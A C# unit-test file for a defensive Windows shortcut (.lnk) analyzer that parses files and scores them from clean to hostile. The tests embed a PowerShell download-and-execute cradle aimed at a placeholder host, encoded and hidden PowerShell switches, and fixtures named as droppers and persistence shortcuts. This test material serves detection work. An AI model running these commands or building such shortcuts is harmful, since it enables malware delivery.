namespace Effigy;

/// <summary>Unit test battery — pure BCL asserts, no test framework.</summary>
public static class Selftest
{
    private static int _pass, _fail;
    private static string _ctx = "";

    private static void Ok(bool cond, string what)
    {
        if (cond) { _pass++; return; }
        _fail++;
        Console.Error.WriteLine($"  FAIL [{_ctx}] {what}");
    }

    private static void Eq<T>(T? a, T? b, string what)
    {
        if (Equals(a, b)) { _pass++; return; }
        _fail++;
        Console.Error.WriteLine($"  FAIL [{_ctx}] {what}: got '{a}' want '{b}'");
    }

    public static int Run()
    {
        _pass = 0; _fail = 0;
        var sw = System.Diagnostics.Stopwatch.StartNew();

        TestCursor();
        TestFileTime();
        TestHeader();
        TestStrings();
        TestIdList();
        TestLinkInfo();
        TestBlocks();
        TestDecode();
        TestRules();
        TestForgeRoundtrip();
        TestTruncation();
        TestJsonMd();

        sw.Stop();
        Console.Out.WriteLine($"  selftest: {_pass} passed, {_fail} failed  ({sw.ElapsedMilliseconds} ms)");
        return _fail == 0 ? 0 : 1;
    }

    private static void TestCursor()
    {
        _ctx = "cursor";
        var c = new Cursor(new byte[] { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x10,
                                        0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 });
        Ok(c.TryReadU16(out ushort u16) && u16 == 0x2211, "u16 le");
        Ok(c.TryReadU32(out uint u32) && u32 == 0x66554433, "u32 le");
        Ok(c.TryReadU64(out ulong u64) && u64 == 0xEEDDCCBBAA998877UL, "u64 le");
        Ok(c.TryReadGuid(out Guid g) && g.ToString("D") == "010010ff-0302-0504-0607-08090a0b0c0d", $"guid le ({g.ToString("D")})");
        int left = c.Remaining;
        Ok(left == 0, $"remaining {left}");
        Ok(!c.TrySkip(1), "overskip refused");
        Ok(!c.TryReadU8(out _), "read past eof refused");
        Ok(!c.TryReadU32(out _), "read u32 past eof refused");

        var c2 = new Cursor(new byte[] { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 });
        Ok(c2.TryReadU64(out ulong v2) && v2 == 0x8877665544332211UL, "u64 full le");
        Ok(c2.Eof, "eof after u64");
        var c3 = new Cursor(new byte[] { 1, 2, 3, 4, 5, 6 });
        Ok(c3.TrySkip(2) && c3.TryReadU32(out uint v3) && v3 == 0x06050403, "skip then read");
        Ok(c3.Seek(0) && c3.TryReadU16(out ushort v4) && v4 == 0x0201, "seek back");
        Ok(!c3.Seek(99), "seek out of range refused");
        Ok(new Cursor(Array.Empty<byte>()).Eof, "empty cursor eof");
    }

    private static void TestFileTime()
    {
        _ctx = "filetime";
        ulong ft = FileTime.FromUnixSeconds(Forge.FixedEpoch);
        Ok(ft == 134044736000000000UL, $"fixed epoch ft ({ft})");
        var dt = FileTime.ToDateTime(ft);
        Ok(dt.Year == 2025 && dt.Month == 10, $"epoch year ({dt.Year}-{dt.Month})");
        Eq(FileTime.ToIso(0), "1601-01-01T00:00:00Z", "zero filetime");
        Eq(FileTime.ToIso(ulong.MaxValue - 1), "9999-12-31T23:59:59Z", "clamp far future");
    }

    private static void TestHeader()
    {
        _ctx = "header";
        var spec = new Forge.Spec { Name = "n", RelativePath = "p" };
        byte[] data = Forge.Build(spec);
        var lnk = Parse(data, out _);
        Ok(lnk.HasValidHeaderClsid, "clsid ok");
        Ok(lnk.HasName && lnk.HasRelativePath, "flags echoed");
        Ok(!lnk.HasArguments, "absent flag stays absent");
        Eq(lnk.SourceBytes, (long)data.Length, "source bytes");

        // corrupt the CLSID
        data[4] ^= 0xFF;
        var lnk2 = Parse(data, out var diag2);
        Ok(!lnk2.HasValidHeaderClsid, "corrupt clsid detected");
        Ok(diag2.Notes.Any(n => n.Contains("CLSID", StringComparison.Ordinal)), "clsid diagnostic");

        // 3-byte file
        var lnk3 = Parse(new byte[] { 0x4C, 0x00, 0x00 }, out var diag3);
        Ok(lnk3.Truncated, "3-byte file truncated");
        Ok(diag3.Notes.Count > 0, "truncation diagnostic");
    }

    private static void TestStrings()
    {
        _ctx = "strings";
        var wide = Parse(Forge.Build(new Forge.Spec
        {
            Name = "Wïdé Name",
            RelativePath = "dir\\file.txt",
            WorkingDir = "C:\\work",
            Arguments = "--flag value",
            IconLocation = "C:\\icon.dll",
        }), out _);
        Eq(wide.NameLabel, "Wïdé Name", "wide name");
        Eq(wide.RelativePath, "dir\\file.txt", "wide relpath");
        Eq(wide.Arguments, "--flag value", "wide args");
        Eq(wide.IconLocation, "C:\\icon.dll", "wide icon");

        var narrow = Parse(Forge.Build(new Forge.Spec
        {
            Wide = false,
            Name = "Narrow",
            RelativePath = "x.exe",
            IconLocation = "C:\\a.exe",
        }), out _);
        Eq(narrow.NameLabel, "Narrow", "narrow name");
        Eq(narrow.IconLocation, "C:\\a.exe", "narrow icon");
        Ok(!narrow.IsUnicode, "unicode flag off");
    }

    private static void TestIdList()
    {
        _ctx = "idlist";
        var lnk = Parse(Forge.Build(new Forge.Spec
        {
            RelativePath = "editor.exe",
            IdList = Forge.Concat(
                Forge.RootItem("20D04FE0-3AEA-1069-A2D8-08002B30309D"),
                Forge.DriveItem("C:"),
                Forge.DirItem("local"),
                Forge.FileItem("editor.exe", true)),
        }), out _);
        Ok(lnk.TargetIdList.Count == 4, $"item count ({lnk.TargetIdList.Count})");
        Eq(lnk.TargetIdList[0].RootGuid, "my-computer", "root label");
        Eq(lnk.TargetIdList[1].Drive, "C:", "drive letter");
        Eq(lnk.TargetIdList[2].Label, "local", "dir label");
        Eq(lnk.TargetIdList[3].Label, "editor.exe", "file label");

        // truncated idlist (declares more than the buffer holds)
        var full = Forge.Build(new Forge.Spec { RelativePath = "x", IdList = Forge.Concat(Forge.DirItem("abc")) });
        var cut = full.Take(40).ToArray(); // inside the idlist region
        var lnk2 = Parse(cut, out var diag);
        Ok(diag.Notes.Any(n => n.Contains("idlist", StringComparison.Ordinal)) || lnk2.Truncated,
            "truncated idlist diagnosed");
    }

    private static void TestLinkInfo()
    {
        _ctx = "linkinfo";
        var local = Parse(Forge.Build(new Forge.Spec
        {
            RelativePath = "a.exe",
            LinkInfo = new Forge.LinkInfoSpec { LocalBasePath = "C:\\Windows\\System32\\cmd.exe", VolumeLabel = "OS" },
        }), out _);
        Ok(local.LinkInfo != null, "linkinfo present");
        Eq(local.LinkInfo!.LocalBasePath, "C:\\Windows\\System32\\cmd.exe", "local base path");
        Eq(local.LinkInfo.VolumeDriveType, 3u, "fixed drive type");
        Eq(local.LinkInfo.VolumeLabel, "OS", "volume label");
        Ok(!local.LinkInfo.HasCommonNetworkLink, "no network");

        var unc = Parse(Forge.Build(new Forge.Spec
        {
            RelativePath = "doc.docx",
            LinkInfo = new Forge.LinkInfoSpec { NetName = "files-balt-01", CommonPathSuffix = "share\\doc.docx" },
        }), out _);
        Ok(unc.LinkInfo != null && unc.LinkInfo.HasCommonNetworkLink, "network link flag");
        Eq(unc.LinkInfo!.NetName, "files-balt-01", "net name");
        Eq(unc.LinkInfo.CommonPathSuffix, "share\\doc.docx", "suffix");
    }

    private static void TestBlocks()
    {
        _ctx = "blocks";
        var t = Parse(Forge.Build(new Forge.Spec
        {
            RelativePath = "x",
            Blocks = { Forge.TrackerBlock("5E4C1A77-3F2B-4A1D-9C0E-1B2A3C4D5E6F",
                "11111111-2222-3333-4444-555555555555", "66666666-7777-8888-9999-000000000000",
                "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee", "ffff0000-1111-2222-3333-444444444444") },
        }), out _);
        Ok(t.Tracker != null, "tracker parsed");
        Eq(t.Tracker!.MachineId.ToString("D"), "5e4c1a77-3f2b-4a1d-9c0e-1b2a3c4d5e6f", "machine guid lowercased");
        Ok(t.ExtraBlocks.Any(b => b.DisplayName == "tracker"), "tracker block name");

        var env = Parse(Forge.Build(new Forge.Spec
        {
            RelativePath = "x",
            Blocks = { Forge.EnvironmentBlock("%TEMP%\\svc.exe") },
        }), out _);
        Eq(env.EnvironmentTarget, "%TEMP%\\svc.exe", "environment target");

        var sp = Parse(Forge.Build(new Forge.Spec
        {
            RelativePath = "x",
            Blocks = { Forge.SpecialFolderBlock(0x07), Forge.KnownFolderBlock(Guid.Parse("B97D20BB-F46A-4C97-BA10-5E3608430854")) },
        }), out _);
        Eq(sp.SpecialFolderId, 0x07u, "special folder id");
        Ok(sp.KnownFolderId == Guid.Parse("B97D20BB-F46A-4C97-BA10-5E3608430854"), "known folder guid");

        // degenerate block sizes must stop the walk without throwing
        var baseBytes = Forge.Build(new Forge.Spec { RelativePath = "x" });
        foreach (var bad in new uint[] { 3, 7, uint.MaxValue - 1 })
        {
            var b = baseBytes.Take(baseBytes.Length - 4).ToArray(); // drop terminal
            var badBytes = BitConverter.GetBytes(bad);
            var withBad = new byte[b.Length + 4 + badBytes.Length];
            Array.Copy(b, withBad, b.Length);
            Array.Copy(badBytes, 0, withBad, b.Length, 4);
            Array.Copy(BitConverter.GetBytes(0u), 0, withBad, b.Length + 4, 4); // terminal after
            var lnk = Parse(withBad, out var diag);
            Ok(diag.Notes.Any(n => n.Contains("extrablocks", StringComparison.Ordinal)) || lnk.Truncated,
                $"degenerate block {bad} handled");
        }
    }

    private static void TestDecode()
    {
        _ctx = "decode";
        // RFC 4648 vectors
        Ok(Decode.TryBase64("", 0, "base64") is null, "empty b64 rejected");
        var p1 = Decode.TryBase64("Zm9vYmFy", 0, "base64");
        Ok(p1 is null, "short b64 rejected");
        var p2 = Decode.TryBase64(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(new string('A', 40))), 0, "base64");
        Ok(p2 != null, "long b64 accepted");
        var payloadText = "IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/x')";
        var p3 = Decode.TryBase64(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(payloadText)), 0, "base64");
        Ok(p3?.Decoded == payloadText, "b64 decodes exactly");
        Ok(Decode.HasCradle(p3!.Decoded!), "cradle detected in decoded text");

        // hex
        var hexText = BitConverter.ToString(System.Text.Encoding.UTF8.GetBytes(new string('X', 40))).Replace("-", "");
        var p4 = Decode.TryHex(hexText, 0);
        Ok(p4?.Decoded == new string('X', 40), "hex decodes");
        // hex garbage (not printable, not MZ) -> rejected
        var mzNo = Decode.TryHex("4d5b0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f", 0);
        Ok(mzNo is null, "non-printable non-MZ hex rejected");
        var mzYes = Decode.TryHex("4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000", 0);
        Ok(mzYes != null, "MZ hex accepted");

        // census
        var census = Decode.ScanText("powershell -nop -enc " + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(payloadText)) + " end");
        Ok(census.Payloads.Any(p => p.Kind == "base64"), "b64 payload found");
        Ok(census.Payloads.Any(p => p.Decoded?.Contains("DownloadString", StringComparison.Ordinal) == true), "decoded payload");
        Ok(Decode.ScanText("nothing interesting here at all").Payloads.Count == 0, "clean text no payloads");

        // char concat
        Ok(Decode.ScanText("$( [char]104+[char]101+[char]108+[char]108+[char]111 )").HasCharConcat, "char concat");
        // xor pattern
        Ok(Decode.ScanText("for($i=0;$i -lt $n;$i++){ $b[$i] = $b[$i] -bxor 0x2f }").HasXorDecoder, "xor decoder");
        // urls / unc / ip
        var c2 = Decode.ScanText("see http://198.51.100.4/a.ps1 and \\\\srv\\share\\x.exe");
        Ok(c2.Urls.Count == 1 && c2.Uncs.Count == 1 && c2.Ips.Count == 1, "url/unc/ip census");

        // switch detection
        Ok(Decode.HasEncodedSwitch("powershell -nop -enc AAAA"), "enc switch");
        Ok(Decode.HasHiddenSwitch("powershell -w hidden -c x"), "hidden switch");
        Ok(!Decode.HasHiddenSwitch("notepad --norc"), "no false hidden");
        Ok(Decode.LooksLikeDocument("Invoice_2026Q4.pdf"), "document name");
        Ok(!Decode.LooksLikeDocument("editor.exe"), "exe not document");
        Ok(Decode.IsLolBinTarget("C:\\Windows\\System32\\mshta.exe"), "lolbin target");
        Ok(!Decode.IsLolBinTarget("C:\\Program Files\\Editor\\editor.exe"), "non-lolbin target");
    }

    private static void TestRules()
    {
        _ctx = "rules";
        var ids = Rules.All.Select(r => r.Id).ToList();
        Eq(ids.Count, ids.Distinct().Count(), "rule ids unique");
        Ok(Rules.All.All(r => r.Weight > 0), "weights positive");
        Ok(Rules.All.All(r => r.Title.Length > 4 && r.Detail.Length > 4), "titles/details present");
        Eq(Verdict.BandFor(0), Band.Clean, "band 0 clean");
        Eq(Verdict.BandFor(9), Band.Clean, "band 9 clean");
        Eq(Verdict.BandFor(10), Band.Watch, "band 10 watch");
        Eq(Verdict.BandFor(24), Band.Watch, "band 24 watch");
        Eq(Verdict.BandFor(25), Band.Suspicious, "band 25 suspicious");
        Eq(Verdict.BandFor(59), Band.Suspicious, "band 59 suspicious");
        Eq(Verdict.BandFor(60), Band.Hostile, "band 60 hostile");
        Eq(Verdict.ExitFor(Band.Clean), 0, "exit clean");
        Eq(Verdict.ExitFor(Band.Watch), 1, "exit watch");
        Eq(Verdict.ExitFor(Band.Suspicious), 3, "exit suspicious");
        Eq(Verdict.ExitFor(Band.Hostile), 10, "exit hostile");
        Ok(Verdict.BandAtLeast(Band.Suspicious, "suspicious"), "gate match");
        Ok(!Verdict.BandAtLeast(Band.Watch, "suspicious"), "gate no match");
        Ok(Rules.All.Select(r => r.Severity).Distinct().Count() == 5, "all severities present");
    }

    private static void TestForgeRoundtrip()
    {
        _ctx = "forge";
        var fixtures = Forge.AllFixtures().ToList();
        Ok(fixtures.Count == 10, $"fixture count ({fixtures.Count})");
        foreach (var (name, bytes) in fixtures)
        {
            var again = Forge.AllFixtures().First(f => f.name == name).bytes;
            Ok(bytes.SequenceEqual(again), $"{name} deterministic");
            var lnk = Parse(bytes, out var diag);
            Ok(lnk.HasValidHeaderClsid, $"{name} parses");
            if (name != "clean-note.lnk" && name != "clean-pdf-ref.lnk")
                Ok(lnk.TargetIdList.Count > 0 || lnk.LinkInfo != null || name == "clean-electron.lnk",
                    $"{name} has target structure");
            _ = diag;
        }

        // expected verdict census on the fixture set
        var expected = new Dictionary<string, Band>
        {
            ["clean-note.lnk"] = Band.Clean,
            ["clean-pdf-ref.lnk"] = Band.Clean,
            ["clean-electron.lnk"] = Band.Watch,
            ["dropper-encoded.lnk"] = Band.Hostile,
            ["dropper-remote.lnk"] = Band.Hostile,
            ["unc-staging.lnk"] = Band.Suspicious,
            ["spoofed-icon.lnk"] = Band.Hostile,
            ["stomped.lnk"] = Band.Hostile,
            ["xor-decoder.lnk"] = Band.Hostile,
            ["startup-persist.lnk"] = Band.Suspicious,
        };
        foreach (var (name, bytes) in fixtures)
        {
            var r = Engine.Analyze(bytes, name, new Diagnostics());
            if (expected.TryGetValue(name, out Band want))
                Eq(r.Band, want, $"{name} band (score {r.Score}: {string.Join(",", r.Findings.Select(f => f.Id))})");
        }
        Ok(Engine.Analyze(fixtures[3].bytes, "x", new Diagnostics()).Findings
            .Any(f => f.Id == Rules.ArgsDecodedLolbin.Id), "decoded lolbin fires on fixture 4");
        Ok(Engine.Analyze(fixtures[8].bytes, "x", new Diagnostics()).Findings
            .Any(f => f.Id == Rules.OverlayScript.Id), "overlay script fires on xor fixture");
    }

    private static void TestTruncation()
    {
        _ctx = "truncation";
        var (name, bytes) = Forge.AllFixtures().First(f => f.name == "dropper-encoded.lnk");
        foreach (int len in new[] { 4, 10, 20, 33, 64, 97, 128, 200, 333, 511, 700 })
        {
            int take = Math.Min(len, bytes.Length);
            var cut = bytes.Take(take).ToArray();
            bool threw = false;
            Band band = Band.Clean;
            try
            {
                var r = Engine.Analyze(cut, "cut", new Diagnostics());
                band = r.Band;
            }
            catch { threw = true; }
            Ok(!threw, $"no throw at {len}");
            // A cut inside the header must not reach hostile; later cuts still
            // carry the surviving (hostile) content — that is correct behavior.
            if (take < 40) Ok(band != Band.Hostile, $"no hostile verdict on header cut {len}");
        }
    }

    private static void TestJsonMd()
    {
        _ctx = "json-md";
        var bytes = Forge.AllFixtures().First(f => f.name == "dropper-encoded.lnk").bytes;
        var r = Engine.Analyze(bytes, "f.lnk", new Diagnostics());
        string json = Verdict.ToJson("f.lnk", r.Band, r.Score, r.Findings, r.Lnk.Diagnostics, r.Lnk.SourceBytes);
        using var doc = System.Text.Json.JsonDocument.Parse(json);
        Ok(doc.RootElement.GetProperty("verdict").GetString() == "hostile", "json verdict");
        Ok(doc.RootElement.GetProperty("findings").GetArrayLength() > 0, "json findings");
        string md = Report.Markdown("f.lnk", r);
        Ok(md.Contains("| severity |", StringComparison.Ordinal) && md.Contains("`args.decoded.lolbin`", StringComparison.Ordinal), "md table");
        string show = Report.Show(r.Lnk, "f.lnk");
        Ok(show.Contains("tracker", StringComparison.OrdinalIgnoreCase), "show has tracker");
        // clean fixture
        var cleanBytes = Forge.AllFixtures().First(f => f.name == "clean-note.lnk").bytes;
        var r2 = Engine.Analyze(cleanBytes, "c.lnk", new Diagnostics());
        Ok(r2.Findings.Count == 0 && r2.Score == 0, "clean fixture zero findings");
    }

    private static LnkFile Parse(byte[] data, out Diagnostics diag)
    {
        diag = new Diagnostics();
        return LnkParser.Parse(data, diag);
    }
}
